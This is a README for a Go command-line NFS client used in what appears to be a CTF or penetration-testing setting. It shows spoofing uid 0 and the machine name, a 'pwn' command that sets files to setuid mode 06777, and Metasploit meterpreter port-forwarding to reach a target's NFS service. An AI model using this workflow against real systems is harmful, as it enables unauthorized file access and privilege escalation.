# nfs-cli

Simple cli for nfs. No NFS acls are bypassed or anything. This is not an exploit. You can set machine identifier, uid and gid though.

(And no, this doesn't work through a metasploit socks proxy, as go doesn't do obey proxychains.)

## Usage
```sh
nfs-cli -machine iamallowed -uid 0 -gid 0 -target /path/to/exported/path -rhost remoteserver
```

Build static (for infil):
```sh
CGO_ENABLED=0 go build -a -ldflags '-extldflags "-static"' .
```

### Commands
Note: Don't include slashes in paths, this tool is pretty dumb.

- `ls` - list files i cwd
- `cd newdir` - change cwd
- `mkdir newdir` - create a directory (mode `06777`)
- `cat file` - view file
- `get file` - download file
- `put file` - upload file (mode `06777`)
- `rm file` - delete file
- `rmdir dir` - delete directory (and recursive)
- `pwn file` - copies `file` to `file.pwn` and sets mode `06777`

The suid-bit doesn't work unless you are root, not sure if this is nfs or the library.

## Example
Metasploit:
```
# we can't forward listening sockets
sudo systemctl stop portmap
sudo systemctl stop rpcbind.socket

sudo msfconsole -q   # 111 is privileged, see below for workaround
...
meterpreter > shell
Process XYZ created.
Channel ZYX created.
$ rpcinfo -a
   program vers proto   port  service
   ...
    100005    2   tcp  20048  mountd      <--this is the portnumber you want
   ...
$ exit
meterpreter > portfwd add -l 111 -L 0.0.0.0 -p 111 -r 127.0.0.1
meterpreter > portfwd add -l 2049 -L 0.0.0.0 -p 2049 -r 127.0.0.1
meterpreter > portfwd add -l 20048 -L 0.0.0.0 -p 20048 -r 127.0.0.1
```

Client:
```
./nfs-cli -uid 0 -gid 0 -machine iamtrusted -rhost localhost -target /home/james
[/home/james] .> ls
  [.                                       ]  1000: 1000 (00700) 129
  [..                                      ]     0:    0 (00000) 0
  [.bash_logout                            ]  1000: 1000 (00644) 18
  [.bash_profile                           ]  1000: 1000 (00644) 141
  [.bashrc                                 ]  1000: 1000 (00644) 312
  [.ssh                                    ]  1000: 1000 (00700) 61
  [.bash_history                           ]     0:    0 (00777) 9
  [user.flag                               ]  1000: 1000 (00644) 38
  [README.md                               ]  1000: 1000 (00777) 2785
[/home/james] .> pwn README.md
[/home/james] .> ls
  [.                                       ]  1000: 1000 (00700) 150
  [..                                      ]     0:    0 (00000) 0
  [.bash_logout                            ]  1000: 1000 (00644) 18
  [.bash_profile                           ]  1000: 1000 (00644) 141
  [.bashrc                                 ]  1000: 1000 (00644) 312
  [.ssh                                    ]  1000: 1000 (00700) 61
  [.bash_history                           ]     0:    0 (00777) 9
  [user.flag                               ]  1000: 1000 (00644) 38
  [README.md                               ]  1000: 1000 (00777) 2785
  [README.md.pwn                           ]     0:    0 (06777) 2785
[/home/james] .> 
```

## Alternative usage (non-priv)
```
git clone https://github.com/go-nfs/nfsv3.git
cd nfsv3
# copy main.go here
# edit nfs/rpc/portmap.go and change PmapPort to 9111
go run . -h
```

Now it's possible to `portfwd add -l 9111 -L 0.0.0.0 -p 111 -r 127.0.0.1` instead. No need to run `msfconsole` as root.
